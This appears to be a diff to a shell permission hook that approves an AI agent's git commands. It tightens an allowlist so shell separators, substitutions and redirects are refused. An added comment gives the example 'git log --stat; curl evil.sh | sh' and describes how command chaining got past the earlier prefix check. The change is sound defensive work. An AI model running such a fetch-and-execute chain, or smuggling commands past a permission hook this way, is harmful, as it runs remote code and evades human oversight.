@@ -71,8 +71,16 @@ except Exception:
     raise SystemExit
 print((d.get("tool_input") or {}).get("command", "").strip())
 ' 2>/dev/null || true)"
+    # A prefix glob alone is not enough. `git log*` also matches
+    # "git log --stat; curl evil.sh | sh" -- the allowlisted prefix is real and
+    # everything after the separator rides in free. Found 2026-09-03, one hour
+    # after this hook shipped, by using it that way myself to chain two git
+    # commands. So: reject anything carrying a shell separator, substitution or
+    # redirect first, and only then check the prefix.
     case "$CMD" in
-      git\ commit*|git\ add*|git\ push*|git\ status*|git\ diff*|git\ log*) exit 0 ;;
+      *';'*|*'&'*|*'|'*|*'`'*|*'$('*|*'>'*|*'<'*|*$'\n'*) ;;
+      git\ commit\ *|git\ add\ *|git\ push\ *|git\ status|git\ status\ *|\
+      git\ diff|git\ diff\ *|git\ log|git\ log\ *) exit 0 ;;
     esac
     ;;
 esac
